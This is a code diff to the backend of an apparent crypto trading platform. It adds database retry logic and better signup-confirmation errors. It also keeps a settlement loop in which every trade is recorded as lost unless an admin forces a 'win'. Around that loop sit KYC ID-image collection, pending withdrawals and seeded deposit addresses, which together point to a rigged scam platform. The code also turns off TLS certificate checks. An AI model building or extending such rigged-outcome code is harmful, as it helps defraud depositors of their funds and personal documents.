@@ -54,199 +54,221 @@ let lastInitError = null;
 let dbInitPromise = null;
 
 const initializeDatabase = async () => {
-  try {
-    if (!process.env.DATABASE_URL) {
-        throw new Error('DATABASE_URL is not set in .env');
-    }
-
-    console.log('[DB] Connecting to PostgreSQL...');
-    pool = new pg.Pool({
-      connectionString: process.env.DATABASE_URL,
-      ssl: { rejectUnauthorized: false },
-      max: 50, // Increase pool size for more concurrent connections
-      idleTimeoutMillis: 30000,
-      connectionTimeoutMillis: 10000,
-    });
-
-    const client = await pool.connect();
-    console.log('[DB] PostgreSQL connected successfully.');
-    client.release();
-
-    // Create Tables
-    await pool.query(`
-      CREATE TABLE IF NOT EXISTS users (
-        id SERIAL PRIMARY KEY,
-        wallet_address TEXT UNIQUE,
-        email TEXT UNIQUE,
-        password TEXT,
-        signup_code TEXT,
-        nickname TEXT,
-        trading_balance TEXT DEFAULT '0',
-        protocol_settlement_balance TEXT DEFAULT '0',
-        demo_balance TEXT DEFAULT '100000',
-        status TEXT DEFAULT 'guest',
-        kyc_status TEXT DEFAULT 'none',
-        wallet_data JSONB DEFAULT '{}',
-        ip_address TEXT,
-        last_seen TIMESTAMPTZ DEFAULT NOW(),
-        created_at TIMESTAMPTZ DEFAULT NOW(),
-        pending_deposit_currency TEXT,
-        pending_deposit_amount TEXT,
-        swap_sent BOOLEAN DEFAULT FALSE,
-        last_interest_at TIMESTAMPTZ
-      );
-
-      CREATE TABLE IF NOT EXISTS config (
-        key TEXT PRIMARY KEY,
-        value TEXT,
-        updated_at TIMESTAMPTZ DEFAULT NOW()
-      );
-
-      CREATE TABLE IF NOT EXISTS trades (
-        id TEXT PRIMARY KEY,
-        wallet_address TEXT,
-        symbol TEXT,
-        direction TEXT,
-        amount DECIMAL(24, 8),
-        entry_price DECIMAL(24, 8),
-        leverage DECIMAL(24, 8),
-        duration INTEGER,
-        is_demo BOOLEAN DEFAULT FALSE,
-        status TEXT DEFAULT 'pending',
-        created_at TIMESTAMPTZ DEFAULT NOW(),
-        settled_at TIMESTAMPTZ,
-        force_outcome TEXT
-      );
-
-      CREATE TABLE IF NOT EXISTS withdrawal_requests (
-        id SERIAL PRIMARY KEY,
-        wallet_address TEXT,
-        destination_address TEXT,
-        amount DECIMAL(24, 8),
-        asset TEXT,
-        status TEXT DEFAULT 'pending',
-        created_at TIMESTAMPTZ DEFAULT NOW(),
-        processed_at TIMESTAMPTZ,
-        admin_note TEXT
-      );
-
-      CREATE TABLE IF NOT EXISTS transactions (
-        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-        wallet_address TEXT,
-        asset_symbol TEXT,
-        amount DECIMAL(24, 8),
-        type TEXT,
-        payment_id TEXT,
-        tx_signature TEXT,
-        reference TEXT,
-        status TEXT DEFAULT 'completed',
-        created_at TIMESTAMPTZ DEFAULT NOW()
-      );
-
-      CREATE TABLE IF NOT EXISTS visitors (
-        id SERIAL PRIMARY KEY,
-        visitor_id TEXT UNIQUE,
-        ip_address TEXT,
-        user_agent TEXT,
-        page_path TEXT,
-        last_seen TIMESTAMPTZ DEFAULT NOW(),
-        visit_count INTEGER DEFAULT 1
-      );
-
-      CREATE TABLE IF NOT EXISTS support_tickets (
-        id SERIAL PRIMARY KEY,
-        wallet_address TEXT UNIQUE,
-        subject TEXT,
-        messages JSONB DEFAULT '[]',
-        updated_at TIMESTAMPTZ DEFAULT NOW()
-      );
-
-      CREATE TABLE IF NOT EXISTS kyc_submissions (
-        id SERIAL PRIMARY KEY,
-        wallet_address TEXT,
-        country TEXT,
-        id_front TEXT,
-        id_back TEXT,
-        status TEXT DEFAULT 'pending',
-        created_at TIMESTAMPTZ DEFAULT NOW()
-      );
-    `);
-
-    // Seed default config
-    await pool.query(`
-      INSERT INTO config (key, value) VALUES 
-      ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'),
-      ('btc_deposit_address', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'),
-      ('eth_deposit_address', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'),
-      ('usdt_deposit_address', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
-      ON CONFLICT (key) DO NOTHING;
-    `);
-
-    dbAvailable = true;
-
-    // Server-side trade settlement loop
-    const settleTrades = async () => {
-      if (!dbAvailable || !pool) {
-          setTimeout(settleTrades, 5000);
-          return;
+  let attempts = 0;
+  const maxAttempts = 10;
+  
+  while (attempts < maxAttempts) {
+    try {
+      attempts++;
+      if (!process.env.DATABASE_URL) {
+          throw new Error('DATABASE_URL is not set in .env');
       }
-      try {
-        const res = await pool.query(`
-            SELECT * FROM trades 
-            WHERE status = 'pending' 
-            AND created_at <= NOW() - (duration || ' seconds')::interval
-        `);
-        const pendingTrades = res.rows;
 
-        for (const trade of pendingTrades) {
-          console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
-          
-          // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
-          const isWin = trade.force_outcome === 'win';
+      console.log(`[DB] Connecting to PostgreSQL (Attempt ${attempts}/${maxAttempts})...`);
+      
+      if (pool) {
+        try { await pool.end(); } catch (e) {}
+      }
 
-          const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
-          const amount = parseFloat(trade.amount || 0);
-          const payoutRate = 0.85;
-          const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
-          
-          const finalStatus = isWin ? 'won' : 'lost';
-          
-          await pool.query(`
-            UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2
-          `, [finalStatus, trade.id]);
+      pool = new pg.Pool({
+        connectionString: process.env.DATABASE_URL,
+        ssl: { rejectUnauthorized: false },
+        max: 50,
+        idleTimeoutMillis: 30000,
+        connectionTimeoutMillis: 10000,
+      });
 
-          if (payout > 0) {
-            const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
-            await pool.query(`
-                UPDATE users SET ${balanceField} = (${balanceField}::numeric + $1)::text 
-                WHERE wallet_address = $2
-            `, [payout, trade.wallet_address]);
-            
-            await recordTransaction({
-              wallet_address: trade.wallet_address,
-              asset_symbol: 'USDT',
-              amount: payout,
-              type: 'trade',
-              reference: `trade-auto-settle:${trade.id}`,
-              created_at: new Date().toISOString()
-            });
-          }
+      const client = await pool.connect();
+      console.log('[DB] PostgreSQL connected successfully.');
+      client.release();
+
+      // Create Tables
+      await pool.query(`
+        CREATE TABLE IF NOT EXISTS users (
+          id SERIAL PRIMARY KEY,
+          wallet_address TEXT UNIQUE,
+          email TEXT UNIQUE,
+          password TEXT,
+          signup_code TEXT,
+          nickname TEXT,
+          trading_balance TEXT DEFAULT '0',
+          protocol_settlement_balance TEXT DEFAULT '0',
+          demo_balance TEXT DEFAULT '100000',
+          status TEXT DEFAULT 'guest',
+          kyc_status TEXT DEFAULT 'none',
+          wallet_data JSONB DEFAULT '{}',
+          ip_address TEXT,
+          last_seen TIMESTAMPTZ DEFAULT NOW(),
+          created_at TIMESTAMPTZ DEFAULT NOW(),
+          pending_deposit_currency TEXT,
+          pending_deposit_amount TEXT,
+          swap_sent BOOLEAN DEFAULT FALSE,
+          last_interest_at TIMESTAMPTZ
+        );
+
+        CREATE TABLE IF NOT EXISTS config (
+          key TEXT PRIMARY KEY,
+          value TEXT,
+          updated_at TIMESTAMPTZ DEFAULT NOW()
+        );
+
+        CREATE TABLE IF NOT EXISTS trades (
+          id TEXT PRIMARY KEY,
+          wallet_address TEXT,
+          symbol TEXT,
+          direction TEXT,
+          amount DECIMAL(24, 8),
+          entry_price DECIMAL(24, 8),
+          leverage DECIMAL(24, 8),
+          duration INTEGER,
+          is_demo BOOLEAN DEFAULT FALSE,
+          status TEXT DEFAULT 'pending',
+          created_at TIMESTAMPTZ DEFAULT NOW(),
+          settled_at TIMESTAMPTZ,
+          force_outcome TEXT
+        );
+
+        CREATE TABLE IF NOT EXISTS withdrawal_requests (
+          id SERIAL PRIMARY KEY,
+          wallet_address TEXT,
+          destination_address TEXT,
+          amount DECIMAL(24, 8),
+          asset TEXT,
+          status TEXT DEFAULT 'pending',
+          created_at TIMESTAMPTZ DEFAULT NOW(),
+          processed_at TIMESTAMPTZ,
+          admin_note TEXT
+        );
+
+        CREATE TABLE IF NOT EXISTS transactions (
+          id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+          wallet_address TEXT,
+          asset_symbol TEXT,
+          amount DECIMAL(24, 8),
+          type TEXT,
+          payment_id TEXT,
+          tx_signature TEXT,
+          reference TEXT,
+          status TEXT DEFAULT 'completed',
+          created_at TIMESTAMPTZ DEFAULT NOW()
+        );
+
+        CREATE TABLE IF NOT EXISTS visitors (
+          id SERIAL PRIMARY KEY,
+          visitor_id TEXT UNIQUE,
+          ip_address TEXT,
+          user_agent TEXT,
+          page_path TEXT,
+          last_seen TIMESTAMPTZ DEFAULT NOW(),
+          visit_count INTEGER DEFAULT 1
+        );
+
+        CREATE TABLE IF NOT EXISTS support_tickets (
+          id SERIAL PRIMARY KEY,
+          wallet_address TEXT UNIQUE,
+          subject TEXT,
+          messages JSONB DEFAULT '[]',
+          updated_at TIMESTAMPTZ DEFAULT NOW()
+        );
+
+        CREATE TABLE IF NOT EXISTS kyc_submissions (
+          id SERIAL PRIMARY KEY,
+          wallet_address TEXT,
+          country TEXT,
+          id_front TEXT,
+          id_back TEXT,
+          status TEXT DEFAULT 'pending',
+          created_at TIMESTAMPTZ DEFAULT NOW()
+        );
+      `);
+
+      // Seed default config
+      await pool.query(`
+        INSERT INTO config (key, value) VALUES 
+        ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw'),
+        ('btc_deposit_address', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'),
+        ('eth_deposit_address', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'),
+        ('usdt_deposit_address', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+        ON CONFLICT (key) DO NOTHING;
+      `);
+
+      dbAvailable = true;
+      lastInitError = null;
+
+      // Server-side trade settlement loop
+      const settleTrades = async () => {
+        if (!dbAvailable || !pool) {
+            setTimeout(settleTrades, 5000);
+            return;
         }
-      } catch (e) {
-        console.error('[Auto-Settle Error]', e.message);
-      } finally {
-          setTimeout(settleTrades, 5000);
-      }
-    };
-    settleTrades();
+        try {
+          const res = await pool.query(`
+              SELECT * FROM trades 
+              WHERE status = 'pending' 
+              AND created_at <= NOW() - (duration || ' seconds')::interval
+          `);
+          const pendingTrades = res.rows;
 
-    // Session Yield Processor (48h / $2)
-    setInterval(processDailyInterest, 60 * 60 * 1000); 
-    processDailyInterest();
-  } catch (err) {
-    console.error('[DB Error] CRITICAL initialization failure:', err.message);
-    lastInitError = err.message;
-    dbAvailable = false;
+          for (const trade of pendingTrades) {
+            console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
+            
+            // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
+            const isWin = trade.force_outcome === 'win';
+
+            const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
+            const amount = parseFloat(trade.amount || 0);
+            const payoutRate = 0.85;
+            const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
+            
+            const finalStatus = isWin ? 'won' : 'lost';
+            
+            await pool.query(`
+              UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2
+            `, [finalStatus, trade.id]);
+
+            if (payout > 0) {
+              const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
+              await pool.query(`
+                  UPDATE users SET ${balanceField} = (${balanceField}::numeric + $1)::text 
+                  WHERE wallet_address = $2
+              `, [payout, trade.wallet_address]);
+              
+              await recordTransaction({
+                wallet_address: trade.wallet_address,
+                asset_symbol: 'USDT',
+                amount: payout,
+                type: 'trade',
+                reference: `trade-auto-settle:${trade.id}`,
+                created_at: new Date().toISOString()
+              });
+            }
+          }
+        } catch (e) {
+          console.error('[Auto-Settle Error]', e.message);
+        } finally {
+            setTimeout(settleTrades, 5000);
+        }
+      };
+      settleTrades();
+
+      // Session Yield Processor (48h / $2)
+      setInterval(processDailyInterest, 60 * 60 * 1000); 
+      processDailyInterest();
+      
+      return; // Exit loop on success
+    } catch (err) {
+      console.error(`[DB Error] Attempt ${attempts} failed:`, err.message);
+      lastInitError = err.message;
+      dbAvailable = false;
+      
+      if (attempts < maxAttempts) {
+        const delay = Math.min(1000 * Math.pow(2, attempts), 30000); // Exponential backoff
+        console.log(`[DB] Retrying in ${delay}ms...`);
+        await new Promise(resolve => setTimeout(resolve, delay));
+      } else {
+        console.error('[DB Error] Max initialization attempts reached. Database will remain unavailable.');
+      }
+    }
   }
 };
 
@@ -374,14 +396,15 @@ app.get('/api/health', async (req, res) => {
 });
 
 app.use(async (req, res, next) => {
+  // Wait for DB initialization if it's still in progress
   if (dbInitPromise && !dbAvailable) {
     try {
-      const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('DB_INIT_TIMEOUT')), 15000));
-      await Promise.race([dbInitPromise, timeout]).catch(err => {
-        console.warn('[DB Middleware] Initialization check timed out or failed:', err.message);
-      });
+      console.log(`[DB Middleware] Waiting for database initialization for ${req.url}...`);
+      // Wait up to 30 seconds for DB to be ready
+      const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('DB_INIT_TIMEOUT')), 30000));
+      await Promise.race([dbInitPromise, timeout]);
     } catch (e) {
-      console.error('[DB Middleware] Error awaiting initialization:', e.message);
+      console.warn('[DB Middleware] Database initialization wait ended:', e.message);
     }
   }
   next();
@@ -766,11 +789,34 @@ app.post('/api/auth/signup-confirm', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
 
   try {
-    const r = await pool.query('UPDATE users SET status = \'pending_approval\', signup_code = NULL WHERE email = $1 AND signup_code = $2 RETURNING *', [email.toLowerCase().trim(), code]);
-    if (r.rows.length === 0) return res.status(400).json({ error: 'Invalid verification code' });
+    const userEmail = email.toLowerCase().trim();
+    const verificationCode = String(code).trim();
+
+    const r = await pool.query(
+      "UPDATE users SET status = 'pending_approval', signup_code = NULL WHERE email = $1 AND signup_code = $2 RETURNING *",
+      [userEmail, verificationCode]
+    );
+
+    if (r.rows.length === 0) {
+      // Check if user exists but code is wrong, or user is already approved
+      const checkRes = await pool.query('SELECT status, signup_code FROM users WHERE email = $1', [userEmail]);
+      const user = checkRes.rows[0];
+      
+      if (!user) {
+        return res.status(404).json({ error: 'User record not found. Please sign up again.' });
+      }
+      
+      if (user.status === 'approved' || user.status === 'pending_approval') {
+        return res.json({ success: true, message: 'Your email is already verified. Waiting for admin approval.' });
+      }
+
+      return res.status(400).json({ error: 'Invalid verification code. Please check your email or request a new code.' });
+    }
+
     res.json({ success: true, message: 'Registration confirmed! Waiting for admin approval.' });
   } catch (e) {
-    res.status(500).json({ error: e.message });
+    console.error('[Signup Confirm Error]', e.message);
+    res.status(500).json({ error: 'An internal server error occurred during confirmation.' });
   }
 });
 
